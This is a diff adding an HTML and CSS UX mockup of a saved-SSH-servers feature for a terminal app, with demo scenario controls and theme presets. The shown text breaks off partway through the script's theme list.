@@ -1,0 +1,1251 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Saved servers (SSH), slice S1: UX mockup</title>
+<style>
+/* Tokens: src/index.css (:root) and the nine presets in src/stores/settingsStore.ts. The preset switch below rewrites the colour tokens exactly as applyThemeToDOM does. */
+:root {
+  --bg-primary: #0A0B0D; --bg-secondary: #0F1013; --bg-tertiary: #15171B; --bg-elevated: #1B1E23; --bg-surface: #262A31;
+  --text-primary: #E8EAED; --text-secondary: #9BA1AC; --text-muted: #5A616D;
+  --accent: #7C8FFF; --accent-subtle: rgba(124, 143, 255, 0.15); --accent-hover: rgba(124, 143, 255, 0.25); --accent-solid: #4A5FE0;
+  --green: #4CC38A; --red: #F4756B; --yellow: #D9A441;
+  --border: rgba(255, 255, 255, 0.055); --border-strong: rgba(255, 255, 255, 0.10);
+  --control-h: 28px; --control-h-sm: 22px;
+  --radius-sm: 4px; --radius: 6px; --radius-lg: 8px;
+  --text-2xs: 10px; --text-xs: 11px; --text-sm: 12px; --text-base: 13px; --text-md: 15px;
+  --tracking-tight: -0.011em; --tracking-micro: 0.06em;
+  --space-1: 4px; --space-1-5: 6px; --space-2: 8px; --space-3: 12px; --space-4: 16px; --space-5: 20px; --space-6: 24px;
+  --elev-3: 0 8px 24px rgba(0, 0, 0, 0.45), 0 2px 6px rgba(0, 0, 0, 0.30);
+  --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.4);
+  --hairline-top: inset 0 1px 0 rgba(255, 255, 255, 0.04);
+  --ease-out: cubic-bezier(0.16, 1, 0.3, 1); --dur-fast: 120ms; --dur-base: 180ms;
+  --font-ui: "Inter Variable", "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
+  --font-mono: "JetBrains Mono Variable", "JetBrains Mono", "SF Mono", ui-monospace, monospace;
+
+  /* New in this spec, all derived, so every preset gets them (spec section 12). */
+  --srv-text: color-mix(in srgb, var(--text-secondary) 60%, var(--text-primary));
+  --srv-edge: color-mix(in srgb, var(--text-primary) 60%, var(--bg-primary));
+  --srv-edge-2: color-mix(in srgb, var(--text-primary) 60%, var(--bg-secondary));
+  --srv-control-edge: color-mix(in srgb, var(--text-primary) 60%, var(--bg-elevated));
+  --srv-red: color-mix(in srgb, var(--red) 60%, var(--text-primary));
+  --srv-yellow: color-mix(in srgb, var(--yellow) 60%, var(--text-primary));
+  --srv-focus: color-mix(in srgb, var(--accent) 60%, var(--text-primary));
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { color-scheme: dark; background: #050506; color: var(--text-primary); font-family: var(--font-ui); -webkit-font-smoothing: antialiased; }
+body { padding: 20px; min-width: 1180px; }
+button, input, select, textarea { font: inherit; color: inherit; }
+.sr { position: absolute; width: 1px; height: 1px; overflow: hidden; clip-path: inset(50%); white-space: nowrap; }
+:focus-visible { outline: 2px solid var(--srv-focus); outline-offset: 1px; }
+
+/* ---------- the page around the stand-in (not part of the design) ---------- */
+.page-h { font-size: 18px; font-weight: 600; margin-bottom: 4px; }
+.page-p { font-size: 13px; color: var(--srv-text); max-width: 1100px; line-height: 1.5; margin-bottom: 12px; }
+.demo { display: grid; grid-template-columns: 1fr 1fr; gap: 10px 20px; padding: 12px 14px; border: 1px dashed var(--srv-edge); border-radius: 8px; margin-bottom: 14px; font-size: 12px; }
+.demo h2 { font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--srv-text); margin-bottom: 6px; font-weight: 600; }
+.demo .row { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; margin-bottom: 6px; }
+.demo select, .demo button, .demo label { font-size: 12px; }
+.demo select, .demo button { height: 26px; padding: 0 8px; background: #17181c; border: 1px solid #6b6f78; color: #e8eaed; border-radius: 4px; cursor: pointer; }
+.demo button:hover { background: #24262c; }
+.demo label { display: inline-flex; gap: 5px; align-items: center; }
+#cap { grid-column: 1 / -1; font-size: 13px; line-height: 1.5; color: #e8eaed; border-top: 1px dashed #4a4d55; padding-top: 8px; min-height: 48px; }
+#cap b { color: #fff; }
+.cols { display: grid; grid-template-columns: 1180px 1fr; gap: 16px; align-items: start; }
+#log { font: 11px/1.5 var(--font-mono); color: #b9bec7; list-style: none; max-height: 700px; overflow: auto; border: 1px dashed #4a4d55; border-radius: 8px; padding: 8px 10px; min-width: 260px; }
+#log li { padding: 2px 0; border-bottom: 1px solid #1c1d21; }
+#log::before { content: "What Better Terminal did (demo log)"; display: block; font: 600 11px var(--font-ui); text-transform: uppercase; letter-spacing: .06em; margin-bottom: 4px; color: #9ba1ac; }
+
+/* ---------- the stand-in window ---------- */
+.win { position: relative; width: 1180px; height: 700px; background: var(--bg-primary); border: 1px solid var(--border-strong); border-radius: 10px; overflow: hidden; display: flex; flex-direction: column; font-size: 13px; }
+.tabbar { height: 44px; flex: 0 0 auto; display: flex; align-items: flex-end; gap: 4px; padding: 0 12px 0 84px; background: var(--bg-secondary); border-bottom: 1px solid var(--border); position: relative; }
+.tabbar::before { content: ""; position: absolute; left: 14px; top: 16px; width: 12px; height: 12px; border-radius: 50%; background: var(--bg-surface); box-shadow: 20px 0 0 var(--bg-surface), 40px 0 0 var(--bg-surface); }
+.tab { display: flex; align-items: center; gap: 6px; font-size: 13px; letter-spacing: -0.01em; cursor: pointer; padding: 6px 14px; min-height: 32px; border: 0; border-radius: var(--radius) var(--radius) 0 0; background: transparent; color: var(--text-secondary); max-width: 230px; min-width: 0; flex-shrink: 1; }
+.tab:hover { background: var(--bg-tertiary); }
+.tab[aria-selected="true"] { background: var(--bg-primary); color: var(--text-primary); font-weight: 500; }
+.tab .nm { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; min-width: 0; }
+.tab svg { flex-shrink: 0; }
+.chev { width: 14px; height: 14px; flex-shrink: 0; } .tab .chev { opacity: .4; } .tab[aria-selected="true"] .chev { opacity: .9; color: var(--accent); }
+.agent-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; background: #58a6ff; }
+.tabbar .plus { align-self: center; margin-left: 4px; width: 26px; height: 26px; border: 0; border-radius: 4px; background: transparent; color: var(--text-secondary); cursor: pointer; font-size: 16px; }
+
+/* The remote mark, drawn as the tab's type icon (spec 5.1). Shape carries the state; colour is the tab's own text colour. */
+.srv-ico { width: 14px; height: 14px; flex-shrink: 0; color: currentColor; }
+.srv-ico[data-state="connecting"] .box { stroke-dasharray: 2 1.7; }
+@keyframes srv-pulse { 0%, 100% { opacity: 1; } 50% { opacity: .7; } }
+.srv-ico[data-state="connecting"] { animation: srv-pulse 1.4s ease-in-out infinite; }
+.rm .srv-ico[data-state="connecting"] { animation: none; }
+@media (prefers-reduced-motion: reduce) { .srv-ico[data-state="connecting"] { animation: none; } }
+
+.body { flex: 1; min-height: 0; display: flex; }
+.panes { flex: 1; min-width: 0; display: flex; }
+.pane { flex: 1; min-width: 0; display: flex; flex-direction: column; position: relative; }
+.pane + .pane { border-left: 1px solid var(--border-strong); }
+.pane.multi { border-top: 2px solid color-mix(in srgb, var(--accent) 25%, transparent); }
+.pane.multi.active { border-top-color: var(--accent); }
+.pane-in { position: relative; flex: 1; min-height: 0; padding: 21px 5px 5px 9px; overflow: hidden; }
+/* TerminalPane.tsx: the header, 4 px down, pointer-events none. A remote pane has no folder, so the mark takes the folder's place. */
+.phead { position: absolute; top: 3px; left: 8px; right: 8px; z-index: 2; display: flex; align-items: center; gap: 6px; pointer-events: none; height: 17px; }
+.phead .cwd { font: 10px var(--font-mono); color: var(--text-muted); opacity: .7; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.chip { display: inline-flex; align-items: center; gap: 4px; height: 16px; padding: 0 5px; border: 1px solid var(--srv-edge); border-radius: 3px; font: 600 10px var(--font-mono); letter-spacing: .06em; color: var(--text-primary); background: var(--bg-primary); flex-shrink: 0; }
+.chip svg { width: 12px; height: 12px; }
+.pnum { font: 600 9px monospace; color: var(--srv-text); border: 1px solid var(--border-strong); border-radius: 4px; padding: 1px 6px; background: var(--bg-secondary); flex-shrink: 0; }
+.pstate { font: 500 11px var(--font-ui); color: var(--srv-text); white-space: nowrap; flex-shrink: 0; }
+.phead .dest { font-size: 11px; }
+.term { height: 100%; font: 13px/1.5 var(--font-mono); color: var(--text-secondary); position: relative; overflow: hidden; cursor: text; }
+.term .ln { white-space: pre; overflow: hidden; }
+.term .ln b { color: var(--text-primary); font-weight: 500; }
+.term .ln i { font-style: normal; color: var(--green); }
+.term .cur { display: inline-block; width: 8px; height: 15px; vertical-align: -2px; border: 1px solid var(--text-secondary); }
+.term:focus-within .cur { background: var(--accent); border-color: var(--accent); }
+.term textarea { position: absolute; left: 0; bottom: 0; width: 1px; height: 1px; opacity: 0; border: 0; resize: none; }
+.term a { color: var(--accent); text-decoration: underline; cursor: pointer; }
+
+/* ---------- the server bar (spec 5.3): one bar for every message a remote pane shows ---------- */
+.srv-bar { flex: 0 0 auto; display: flex; align-items: flex-start; gap: 10px; padding: 8px 12px 8px 9px; background: var(--bg-secondary); border-bottom: 1px solid var(--border-strong); border-left: 3px solid transparent; font-size: var(--text-sm); line-height: 17px; }
+.srv-bar[data-tone="warn"] { border-left-color: var(--srv-yellow); }
+.srv-bar .ico { flex-shrink: 0; width: 16px; height: 16px; margin-top: 1px; color: var(--srv-text); }
+.srv-bar[data-tone="warn"] .ico { color: var(--srv-yellow); }
+.srv-bar .txt { flex: 1; min-width: 0; }
+.srv-bar .ttl { font-weight: 600; color: var(--text-primary); font-size: var(--text-base); overflow-wrap: anywhere; }
+.srv-bar .bd { color: var(--srv-text); max-width: 78ch; overflow-wrap: anywhere; }
+.srv-bar .acts { display: flex; gap: 8px; align-items: center; flex-shrink: 0; flex-wrap: wrap; justify-content: flex-end; max-width: 50%; }
+.srv-bar .pair { display: grid; grid-template-columns: max-content minmax(0, 1fr); gap: 3px 8px; margin-top: 4px; align-items: center; color: var(--srv-text); }
+.srv-bar .pairv { min-width: 0; display: flex; gap: 8px; align-items: center; }
+.srv-bar .pairv .key { font: 11px var(--font-mono); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; min-width: 0; unicode-bidi: isolate; }
+.srv-bar code, .srv code, .cdlg code { font: 12px var(--font-mono); color: var(--text-primary); }
+
+/* A destination summary: one line, never wraps; the head gives way, the end of the host and the port always show (spec 9). */
+.dest { display: inline-flex; max-width: 100%; min-width: 0; vertical-align: middle; font: 12px var(--font-mono); color: var(--srv-text); background: var(--bg-primary); border: 1px solid var(--srv-edge-2); border-radius: 3px; padding: 0 5px; height: 18px; line-height: 16px; white-space: nowrap; unicode-bidi: isolate; direction: ltr; }
+.dest .hd { overflow: hidden; text-overflow: ellipsis; min-width: 1ch; flex: 0 1 auto; }
+.dest .tl { flex: 0 0 auto; }
+.nm-box, bdi.nmv { unicode-bidi: isolate; }
+
+/* ---------- ui.css, verbatim where used ---------- */
+.ui-btn { display: inline-flex; align-items: center; justify-content: center; gap: var(--space-1-5); font-family: var(--font-ui); font-weight: 500; line-height: 1; border: 1px solid transparent; border-radius: var(--radius-sm); cursor: pointer; white-space: nowrap; user-select: none; }
+.ui-btn:disabled { opacity: 0.45; cursor: not-allowed; }
+.ui-btn--md { height: var(--control-h); padding: 0 var(--space-3); font-size: var(--text-sm); }
+.ui-btn--icon { padding: 0; aspect-ratio: 1; min-width: 24px; min-height: 24px; }
+.ui-btn--primary { background: var(--accent-solid); color: white; box-shadow: var(--hairline-top); }
+.ui-btn--primary:hover:not(:disabled) { filter: brightness(1.12); }
+.ui-btn--secondary { background: var(--bg-elevated); color: var(--text-primary); border-color: var(--border); box-shadow: var(--hairline-top); }
+.ui-btn--secondary:hover:not(:disabled) { background: var(--bg-surface); border-color: var(--border-strong); }
+.ui-btn--ghost { background: transparent; color: var(--text-secondary); }
+.ui-btn--ghost:hover:not(:disabled) { background: var(--bg-elevated); color: var(--text-primary); }
+/* Scoped override, stated in the spec (12): inside F7's surfaces a secondary button gets an outline that reaches 3:1, and a ghost button the body text colour. */
+.srv .ui-btn--secondary, .srv-bar .ui-btn--secondary { border-color: var(--srv-control-edge); }
+.srv .ui-btn--ghost, .srv-bar .ui-btn--ghost { color: var(--srv-text); border-color: var(--srv-control-edge); }
+
+/* ---------- overlays ---------- */
+.scrim { position: absolute; inset: 0; z-index: 900; background: rgba(0, 0, 0, .5); display: flex; align-items: flex-start; justify-content: center; padding-top: 8vh; }
+/* The server list: the shell Integrations uses (.contracts-panel-overlay / .contracts-panel). */
+.srv { width: min(760px, 94%); max-height: 86%; display: flex; flex-direction: column; overflow: hidden; background: var(--bg-secondary); border: 1px solid var(--border-strong); border-radius: var(--radius-lg); box-shadow: var(--shadow-lg); position: relative; }
+@keyframes overlay-in { from { opacity: 0; transform: translateY(-4px) scale(0.99); } to { opacity: 1; transform: none; } }
+.srv, .pal, .sw { animation: overlay-in var(--dur-base) var(--ease-out); }
+.rm .srv, .rm .pal, .rm .sw { animation: none; }
+@media (prefers-reduced-motion: reduce) { .srv, .pal, .sw { animation: none; } }
+.srv__header { display: flex; align-items: center; gap: 10px; padding: 10px 12px 10px 16px; border-bottom: 1px solid var(--border); }
+.srv__header h2 { font-size: 14px; font-weight: 600; }
+.srv__count { font: 11px var(--font-mono); color: var(--srv-text); flex: 1; }
+.srv__body { flex: 1; min-height: 0; overflow-y: auto; padding: 12px 16px 16px; }
+.srv__foot { padding: 8px 16px; border-top: 1px solid var(--border); background: var(--bg-tertiary); font-size: var(--text-xs); line-height: 16px; color: var(--srv-text); }
+.srv__formfoot { display: flex; justify-content: flex-end; gap: 8px; padding: 12px 16px; border-top: 1px solid var(--border); background: var(--bg-tertiary); }
+.srv-msg { display: flex; gap: 10px; align-items: flex-start; padding: 8px 10px; margin-bottom: 10px; background: var(--bg-tertiary); border: 1px solid var(--srv-control-edge); border-radius: var(--radius-sm); font-size: var(--text-sm); line-height: 17px; color: var(--text-primary); }
+.srv-msg .ico { width: 16px; height: 16px; flex-shrink: 0; margin-top: 1px; color: var(--srv-yellow); }
+.srv-msg[data-tone="bad"] .ico { color: var(--srv-red); }
+.srv-msg .txt { flex: 1; min-width: 0; overflow-wrap: anywhere; }
+.srv-msg b { font-weight: 600; }
+.filter { width: 100%; height: 28px; padding: 0 8px; margin-bottom: 8px; background: var(--bg-tertiary); border: 1px solid var(--srv-control-edge); border-radius: var(--radius-sm); font-size: var(--text-sm); color: var(--text-primary); }
+.filter::placeholder, .fld input::placeholder { color: var(--srv-text); opacity: .8; }
+.grid { display: flex; flex-direction: column; }
+.grow { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 12px; align-items: center; padding: 8px 6px 8px 8px; border-radius: var(--radius-sm); border-bottom: 1px solid var(--border); }
+.grow:hover, .grow:focus-within { background: var(--bg-elevated); }
+.gmain { min-width: 0; display: grid; grid-template-columns: 16px minmax(0, 1fr); column-gap: 10px; row-gap: 3px; align-items: center; }
+.gmain .srv-ico { color: var(--srv-text); }
+.gname { font-size: var(--text-base); font-weight: 600; color: var(--text-primary); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.gsub { grid-column: 2; display: flex; gap: 8px; align-items: center; min-width: 0; font-size: var(--text-xs); color: var(--srv-text); }
+.gsub .key { font: 11px var(--font-mono); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; min-width: 0; unicode-bidi: isolate; }
+.gwarn { grid-column: 2; display: flex; gap: 6px; align-items: center; font-size: var(--text-xs); color: var(--srv-yellow); }
+.gwarn[data-tone="bad"] { color: var(--srv-red); }
+.gwarn svg { width: 12px; height: 12px; flex-shrink: 0; }
+.gacts { display: flex; gap: 6px; }
+.group-h { font-size: var(--text-xs); font-weight: 600; color: var(--srv-text); text-transform: uppercase; letter-spacing: var(--tracking-micro); padding: 8px 8px 4px; }
+.empty { text-align: center; padding: 32px 24px 28px; }
+.empty .big { width: 40px; height: 40px; color: var(--srv-text); margin-bottom: 10px; }
+.empty h3 { font-size: var(--text-md); font-weight: 600; margin-bottom: 6px; }
+.empty p { font-size: var(--text-sm); line-height: 18px; color: var(--srv-text); max-width: 54ch; margin: 0 auto 8px; }
+.empty .ui-btn { margin-top: 8px; }
+/* The form */
+.form { display: grid; grid-template-columns: 1fr 1fr; gap: 12px 14px; }
+.fld { display: flex; flex-direction: column; gap: 5px; min-width: 0; }
+.fld.wide { grid-column: 1 / -1; }
+.fld label { font-size: var(--text-xs); font-weight: 500; color: var(--srv-text); }
+.fld label .opt { font-weight: 400; }
+.fld input { height: 28px; padding: 0 8px; background: var(--bg-tertiary); border: 1px solid var(--srv-control-edge); border-radius: var(--radius-sm); font-size: var(--text-sm); color: var(--text-primary); min-width: 0; }
+.fld input.mono { font-family: var(--font-mono); }
+.fld input[aria-invalid="true"] { border-color: var(--srv-red); border-width: 2px; padding: 0 7px; }
+.fld .hint { font-size: var(--text-xs); line-height: 15px; color: var(--srv-text); }
+.fld .err, .fld .warn { display: flex; gap: 6px; font-size: var(--text-xs); line-height: 15px; color: var(--srv-red); }
+.fld .warn { color: var(--srv-yellow); }
+.fld .err svg, .fld .warn svg { width: 12px; height: 12px; flex-shrink: 0; margin-top: 1px; }
+.fld .err b { font-weight: 600; }
+.preview { grid-column: 1 / -1; display: flex; gap: 8px; align-items: center; font-size: var(--text-xs); color: var(--srv-text); padding-top: 4px; border-top: 1px solid var(--border); min-width: 0; }
+/* The Remove question, inside the list overlay */
+.ask-scrim { position: absolute; inset: 0; background: rgba(0, 0, 0, .5); display: flex; align-items: center; justify-content: center; z-index: 5; }
+.ask { width: min(420px, 90%); background: var(--bg-secondary); border: 1px solid var(--srv-control-edge); border-radius: var(--radius-lg); box-shadow: var(--elev-3); padding: 18px 18px 14px; }
+.ask h3 { font-size: 14px; font-weight: 600; margin-bottom: 8px; overflow-wrap: anywhere; }
+.ask p { font-size: var(--text-sm); line-height: 18px; color: var(--srv-text); margin-bottom: 14px; }
+.ask .btns { display: flex; justify-content: flex-end; gap: 8px; }
+
+/* Palette (CommandPalette.tsx) */
+.scrim.palz { z-index: 2500; padding-top: 80px; }
+.pal { width: 520px; max-height: 420px; background: var(--bg-secondary); border: 1px solid var(--border-strong); border-radius: 12px; box-shadow: 0 24px 80px rgba(0, 0, 0, 0.6); overflow: hidden; display: flex; flex-direction: column; }
+.pal__in { padding: 12px 16px; border-bottom: 1px solid var(--border); }
+.pal__in input { width: 100%; background: var(--bg-primary); border: 1px solid var(--border); border-radius: 8px; padding: 10px 14px; font: 14px var(--font-mono); color: var(--text-primary); outline: none; }
+.pal__in input:focus { border-color: var(--accent); }
+.pal__list { flex: 1; overflow-y: auto; padding: 4px 0; }
+.pal__item { display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 8px 16px; cursor: pointer; border-left: 2px solid transparent; min-width: 0; }
+.pal__item[aria-selected="true"] { background: var(--accent-subtle); border-left-color: var(--accent); }
+.pal__item .l { display: flex; align-items: center; gap: 10px; min-width: 0; }
+.pal__cat { font: 700 9px monospace; padding: 2px 5px; border-radius: 3px; min-width: 44px; text-align: center; flex-shrink: 0; }
+.pal__lab { font-size: 13px; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; min-width: 0; display: flex; gap: 8px; align-items: center; }
+.pal__item[aria-selected="true"] .pal__lab { color: var(--text-primary); }
+.pal kbd { font: 500 11px monospace; color: var(--text-muted); background: var(--bg-tertiary); padding: 2px 8px; border-radius: 4px; border: 1px solid var(--border); flex-shrink: 0; }
+.pal__foot { padding: 8px 16px; border-top: 1px solid var(--border); display: flex; gap: 16px; font: 11px monospace; color: var(--text-muted); }
+.pal__none { padding: 20px; text-align: center; color: var(--text-muted); font-size: 13px; }
+
+/* Tab switcher (TabSwitcher.tsx) */
+.sw { width: min(640px, 94%); max-height: 70%; display: flex; flex-direction: column; overflow: hidden; background: var(--bg-secondary); border: 1px solid var(--border-strong); border-radius: var(--radius-lg); box-shadow: var(--shadow-lg); }
+.sw input { margin: 10px; height: 30px; padding: 0 10px; background: var(--bg-primary); border: 1px solid var(--border); border-radius: 6px; font-size: 13px; color: var(--text-primary); }
+.sw ul { list-style: none; overflow-y: auto; padding: 0 6px 6px; }
+.sw li { display: flex; align-items: center; gap: 8px; padding: 6px 8px; border-radius: 4px; cursor: pointer; font-size: 13px; min-width: 0; }
+.sw li[aria-selected="true"] { background: var(--accent-subtle); }
+.sw .num { font: 11px var(--font-mono); color: var(--srv-text); width: 14px; }
+.sw .name { font-weight: 500; flex-shrink: 0; max-width: 40%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.sw .path { font: 11px var(--font-mono); color: var(--text-muted); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; min-width: 0; }
+.sw .st { font-size: 11px; color: var(--srv-text); white-space: nowrap; flex-shrink: 0; }
+
+/* Tab menu (TabBar.tsx) */
+.menu { position: absolute; z-index: 1000; background: var(--bg-secondary); border: 1px solid var(--border-strong); border-radius: 8px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4); padding: 4px 0; min-width: 200px; }
+.menu button { display: block; width: 100%; text-align: left; padding: 6px 14px; font-size: 12px; font-weight: 500; color: var(--text-secondary); background: transparent; border: 0; cursor: pointer; min-height: 26px; }
+.menu button:hover, .menu button:focus-visible { background: var(--bg-elevated); color: var(--text-primary); }
+.menu button.sep { border-top: 1px solid var(--border); margin-top: 4px; padding-top: 9px; }
+.menu button:disabled { opacity: .4; cursor: default; }
+.menu .note { padding: 7px 14px 5px; margin-top: 4px; border-top: 1px solid var(--border); font-size: 11px; line-height: 15px; color: var(--srv-text); max-width: 230px; }
+.menu-catch { position: absolute; inset: 0; z-index: 999; }
+
+/* ConfirmDialog.tsx, today's look */
+.cscrim { position: absolute; inset: 0; z-index: 9999; background: rgba(0, 0, 0, .6); display: flex; align-items: center; justify-content: center; }
+.cdlg { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 24px; max-width: 420px; width: 90%; box-shadow: 0 16px 48px rgba(0, 0, 0, 0.4); }
+.cdlg .h { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 12px; font-size: 15px; font-weight: 600; overflow-wrap: anywhere; }
+.cdlg .h svg { width: 20px; height: 20px; flex-shrink: 0; color: #d29922; }
+.cdlg p { font-size: 13px; color: var(--text-secondary); margin: 0 0 20px; line-height: 1.5; overflow-wrap: anywhere; }
+.cdlg .btns { display: flex; justify-content: flex-end; gap: 8px; }
+.cbtn { padding: 6px 16px; border-radius: var(--radius-sm); font-size: 13px; cursor: pointer; }
+.cbtn--cancel { border: 1px solid var(--border); background: var(--bg-tertiary); color: var(--text-secondary); font-weight: 500; }
+.cbtn--cancel:hover { background: var(--bg-elevated); }
+.cbtn--ok { border: 1px solid #d2992250; background: #d2992220; color: #d29922; font-weight: 600; }
+.cbtn--ok:hover { background: #d2992235; }
+
+/* Toast.tsx, today's slot and look */
+.toast { position: absolute; right: 20px; bottom: 60px; z-index: 2500; max-width: 320px; background: var(--bg-elevated); border: 1px solid var(--border-strong); border-radius: var(--radius); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4); padding: 12px 16px; }
+.toast .t { font-size: 13px; font-weight: 600; color: var(--text-primary); margin-bottom: 2px; }
+.toast .b { font-size: 12px; color: var(--text-secondary); }
+
+/* Stand-ins for the file browser and the scratchpad */
+.fb { width: 220px; flex-shrink: 0; border-left: 1px solid var(--border-strong); background: var(--bg-secondary); padding: 10px 12px; font-size: 12px; }
+.fb h3 { font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--srv-text); margin-bottom: 8px; }
+.fb .tree { font: 12px/1.7 var(--font-mono); color: var(--text-secondary); }
+.fb .onsrv { color: var(--srv-text); line-height: 17px; }
+.fb .onsrv b { display: block; color: var(--text-primary); font-size: 13px; margin-bottom: 4px; }
+.scratch { flex-shrink: 0; border-top: 1px solid var(--border-strong); background: var(--bg-secondary); padding: 10px 12px; display: flex; gap: 10px; align-items: flex-start; }
+.scratch .box { flex: 1; min-width: 0; }
+.scratch textarea { width: 100%; height: 44px; background: var(--bg-tertiary); border: 1px solid var(--srv-control-edge); border-radius: 4px; padding: 6px 8px; font: 12px var(--font-mono); color: var(--text-primary); resize: none; }
+.scratch .img { display: inline-flex; gap: 6px; align-items: center; font: 11px var(--font-mono); color: var(--srv-text); border: 1px solid var(--srv-control-edge); border-radius: 3px; padding: 1px 6px; margin-top: 4px; }
+.scratch .why { font-size: 12px; line-height: 17px; color: var(--text-primary); margin-top: 6px; display: flex; gap: 6px; }
+.scratch .why svg { width: 14px; height: 14px; color: var(--srv-yellow); flex-shrink: 0; margin-top: 2px; }
+[hidden] { display: none !important; }
+</style>
+</head>
+<body>
+<h1 class="page-h">Saved servers (SSH), slice S1: UX mockup</h1>
+<p class="page-p">A stand-in Better Terminal window with the tab bar, terminal panes, the command palette and the server list. Spec: <code>2026-11-18-saved-servers-ux.md</code>, beside this file. Everything inside the framed window is the design; the dashed boxes above and to the right are demo controls. Nothing here connects to anything: the "start-up files" control decides what a Connect pretends to see. Host, user and client names are invented. The 30 s hand-over bound runs as 3 s while “Fast timer” is ticked. Keys: Ctrl+P or ⌘P opens the palette, Ctrl+K or ⌘K the tab switcher, Shift+F10 on a tab its menu.</p>
+
+<div class="demo" id="demo">
+  <div>
+    <h2>Scenario</h2>
+    <div class="row"><select id="scn" aria-label="Scenario"></select> <button id="prev" type="button">Previous</button> <button id="next" type="button">Next</button></div>
+    <div class="row">
+      <label>Preset <select id="theme" aria-label="Theme preset"></select></label>
+      <label><input type="checkbox" id="rm"> Reduced motion</label>
+      <label><input type="checkbox" id="fast" checked> Fast timer (the 30 s hand-over bound runs as 3 s)</label>
+    </div>
+    <div class="row"><label>What the start-up files do at the next Connect <select id="rc" aria-label="Start-up files behaviour">
+      <option value="quick">hand over to ssh quickly</option>
+      <option value="another">replace the shell with another program (tmux)</option>
+      <option value="waiting">ask a question and wait</option>
+      <option value="child">run ssh as a child of the shell</option>
+      <option value="silent">a function named exec that returns (status 0)</option>
+      <option value="nossh">no ssh on PATH (status 127)</option>
+      <option value="spawn">the shell cannot be started</option>
+    </select></label>
+    <label>Login shell <select id="shell" aria-label="Login shell"><option>zsh</option><option>bash</option><option>fish</option><option value="?">a name that cannot be shown</option></select></label></div>
+  </div>
+  <div>
+    <h2>Stand-ins for existing actions</h2>
+    <div class="row" id="acts"></div>
+    <div class="row"><label>A Better Terminal write comes from <select id="writer" aria-label="Which feature writes"><option value="tokens">the Tokens panel</option><option value="guard">the context guard's button</option><option value="picker">the agent picker, This terminal</option><option value="foundry">Contracts, New Foundry project</option><option value="slop">the anti-slop fix</option><option value="insert">the sub-terminal notice, Insert command</option></select></label></div>
+    <div class="row" id="tries" hidden></div>
+  </div>
+  <div id="cap" aria-live="off"></div>
+</div>
+
+<div class="cols">
+  <div class="win" id="win">
+    <div class="tabbar" role="tablist" aria-label="Tabs" id="tabbar"></div>
+    <div class="body"><div class="panes" id="panes"></div><aside class="fb" id="fb" hidden aria-label="File browser (stand-in)"></aside></div>
+    <div class="scratch" id="scratch" hidden></div>
+    <div id="layer"></div>
+    <div id="toasts"></div>
+    <div class="sr" aria-live="polite" id="say"></div>
+  </div>
+  <ol id="log" aria-label="Demo log"></ol>
+</div>
+<script>
+"use strict";
+/* The nine presets, from src/stores/settingsStore.ts (THEME_PRESETS, UI colours only). */
+const THEMES = [
+  ["Precision", "#0A0B0D", "#0F1013", "#15171B", "#1B1E23", "#262A31", "#E8EAED", "#9BA1AC", "#5A616D", "#7C8FFF", "#4A5FE0", "#4CC38A", "#F4756B", "#D9A441", "rgba(255, 255, 255, 0.055)", "rgba(255, 255, 255, 0.10)"],
+  ["GitHub Dark", "#0d1117", "#161b22", "#1c2128", "#21262d", "#30363d", "#e6edf3", "#8b949e", "#484f58", "#58a6ff", "#2F6FD0", "#3fb950", "#ff7b72", "#d29922", "rgba(240, 246, 252, 0.1)", "rgba(240, 246, 252, 0.15)"],
+  ["Dracula", "#282a36", "#21222c", "#2d2f3d", "#343746", "#44475a", "#f8f8f2", "#b0b8d1", "#6272a4", "#bd93f9", "#6D50C4", "#50fa7b", "#ff5555", "#f1fa8c", "rgba(248, 248, 242, 0.1)", "rgba(248, 248, 242, 0.15)"],
+  ["Monokai Pro", "#2d2a2e", "#221f22", "#363337", "#403e41", "#5b595c", "#fcfcfa", "#c1c0c0", "#727072", "#ffd866", "#38788F", "#a9dc76", "#f92672", "#e6db74", "rgba(252, 252, 250, 0.1)", "rgba(252, 252, 250, 0.15)"],
+  ["Nord", "#2e3440", "#272c36", "#353b49", "#3b4252", "#434c5e", "#eceff4", "#d8dee9", "#4c566a", "#88c0d0", "#52719A", "#a3be8c", "#bf616a", "#ebcb8b", "rgba(236, 239, 244, 0.1)", "rgba(236, 239, 244, 0.15)"],
+  ["Catppuccin Mocha", "#1e1e2e", "#181825", "#252536", "#313244", "#45475a", "#cdd6f4", "#bac2de", "#585b70", "#89b4fa", "#5C6FA5", "#a6e3a1", "#f38ba8", "#f9e2af", "rgba(205, 214, 244, 0.1)", "rgba(205, 214, 244, 0.15)"],
+  ["Solarized Dark", "#002b36", "#001f27", "#073642", "#0a4050", "#586e75", "#fdf6e3", "#93a1a1", "#586e75", "#268bd2", "#1F6E8C", "#859900", "#dc322f", "#b58900", "rgba(253, 246, 227, 0.1)", "rgba(253, 246, 227, 0.15)"],
+  ["Tokyo Night", "#1a1b26", "#16161e", "#1f2030", "#24283b", "#414868", "#c0caf5", "#a9b1d6", "#565f89", "#7aa2f7", "#3D59A1", "#9ece6a", "#f7768e", "#e0af68", "rgba(192, 202, 245, 0.1)", "rgba(192, 202, 245, 0.15)"],
